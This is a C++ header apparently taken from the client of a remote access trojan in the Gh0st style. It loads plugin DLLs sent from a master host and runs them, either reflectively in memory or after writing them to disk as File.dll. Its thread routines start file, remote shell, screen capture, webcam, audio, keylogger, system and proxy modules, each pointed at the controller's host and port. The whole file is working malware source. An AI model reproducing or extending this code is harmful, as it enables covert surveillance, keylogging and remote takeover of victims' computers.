#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "MyKernelManager.h"

#include <wininet.h>

extern HMODULE hSelf;
extern UINT BufSize;

typedef BOOL(*PluginMe)(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer);
typedef BOOL(*PluginMeEx)(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags);

#ifndef FILELOAD

#include "MemLoadDll.h"

void LoadPlugin(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	HMEMORYMODULE HDll = MemoryLoadLibrary(data);
	if (HDll == NULL)
	{
		MsgErr(_T("Can not load dll into memory"));
		return;
	}

	PluginMe myPluginMe = (PluginMe)MemoryGetProcAddress(HDll, "PluginMe");

#ifdef UNICODE
	CHAR lpHost[1024];
	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);

	myPluginMe(lpHost, nPort, lpBuffer);
#else
	myPluginMe(lpszHost, nPort, lpBuffer);
#endif

	MemoryFreeLibrary(HDll);
}

void LoadPluginEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags)
{
	HMEMORYMODULE module = MemoryLoadLibrary(data);
	if (module == NULL)
	{
		MsgErr(_T("Can not load dll into memory"));
		return;
	}

	PluginMeEx myPluginMeEx = (PluginMeEx)MemoryGetProcAddress(module, "PluginMeEx");

#ifdef UNICODE
	CHAR lpHost[1024];
	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);

	myPluginMeEx(lpHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
#else
	myPluginMeEx(lpszHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
#endif

	MemoryFreeLibrary(module);
}

#else

void LoadPlugin(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	DWORD rt;
	HANDLE h = CreateFile(_T("File.dll"), GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(h, data, BufSize - 1, &rt, NULL);
	CloseHandle(h);

	HMODULE HDll;
	PluginMe myPluginMe;

	HDll = LoadLibrary(_T("File.dll"));

	if (HDll == NULL)
	{
		MsgErr(_T("Can not load dll"));
		return;
	}

	myPluginMe = (PluginMe)GetProcAddress(HDll, "PluginMe");

#ifdef UNICODE
	CHAR lpHost[1024];
	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);

	myPluginMe(lpHost, nPort, lpBuffer);
#else
	myPluginMe(lpszHost, nPort, lpBuffer);
#endif

	FreeLibrary(HDll);

	//if (data) HeapFree(GetProcessHeap(), 0,data);
}

void LoadPluginEx(LPVOID data, LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer, LPBYTE lpFun1, LPBYTE lpFun2, DWORD flags)
{
	DWORD rt;
	HANDLE h = CreateFile(_T("File.dll"), GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(h, data, BufSize - 1, &rt, NULL);
	CloseHandle(h);

	HMODULE module;
	PluginMeEx myPluginMeEx;

	module = LoadLibrary(_T("File.dll"));
	if (module == NULL)
	{
		MsgErr(_T("Can not load dll"));
		return;
	}

	myPluginMeEx = (PluginMeEx)GetProcAddress(module, "PluginMeEx");

#ifdef UNICODE
	CHAR lpHost[1024];
	WideCharToMultiByte(CP_OEMCP, NULL, lpszHost, -1, lpHost, 1024, NULL, FALSE);

	myPluginMeEx(lpHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
#else
	myPluginMeEx(lpszHost, nPort, lpBuffer, lpFun1, lpFun2, flags);
#endif

	FreeLibrary(module);

	//if (data) HeapFree(GetProcessHeap(), 0,data);
}
#endif

BOOL WINAPI SelectDesktop()
{
	HDESK desktop = OpenInputDesktop(0, FALSE,
		DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
		DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
		DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);

	if (desktop != NULL)
	{
		SetThreadDesktop(desktop);
		CloseDesktop(desktop);
		return TRUE;
	}

	return FALSE;
}

DWORD WINAPI Loop_MyFileManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyShellManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyScreenManager(LPVOID lparam)
{
	SelectDesktop();

	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_MyVideoManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyAudioManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_MyKeyboardManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, (LPBYTE)hSelf);
	return 0;
}

DWORD WINAPI Loop_MySystemManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	return 0;
}

DWORD WINAPI Loop_ProxyManager(LPVOID lparam)
{
	LoadPlugin(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, NULL);
	Sleep(100);
	return 0;
}

extern TCHAR svcname[MAX_PATH];

DWORD WINAPI Loop_MyTools(LPVOID lparam)
{
	SelectDesktop();

	LoadPluginEx(lparam, CMyKernelManager::m_strMasterHost, CMyKernelManager::m_nMasterPort, (LPBYTE)lparam, (LPBYTE)svcname, NULL, NULL);
	Sleep(100);
	return 0;
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
